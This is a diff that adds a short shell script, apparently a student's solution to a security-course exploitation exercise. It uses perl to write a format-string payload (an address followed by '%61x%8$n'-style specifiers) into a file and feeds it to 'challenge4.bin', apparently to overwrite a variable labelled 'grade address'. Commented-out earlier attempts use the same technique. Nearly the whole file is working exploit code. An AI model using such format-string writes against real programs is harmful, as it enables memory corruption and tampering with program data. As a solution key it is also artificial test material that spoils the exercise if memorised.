@@ -1,0 +1,14 @@
+#0x0804a01c = grade address
+#19th word = address added
+#perl -e 'print "\x1c\xa0\x04\x08";' > attack_spell4.txt
+#perl -e 'print "\x1b\xa0\x04\x08";' >> attack_spell4.txt
+#perl -e 'print "\x1a\xa0\x04\x08";' >> attack_spell4.txt
+#perl -e 'print "\x19\xa0\x04\x08";' >> attack_spell4.txt
+#perl -e 'print "%1\$49x%19\$n";' >> attack_spell4.txt
+
+perl -e 'print "\x1c\xa0\x04\x08";' > attack_spell4.txt
+perl -e 'print "%1\$61x%8\$n";' >> attack_spell4.txt
+perl -e 'print " \n";' >> attack_spell4.txt 
+perl -e 'print "Rock Beom Kim ";' >> attack_spell4.txt
+
+./challenge4.bin < attack_spell4.txt
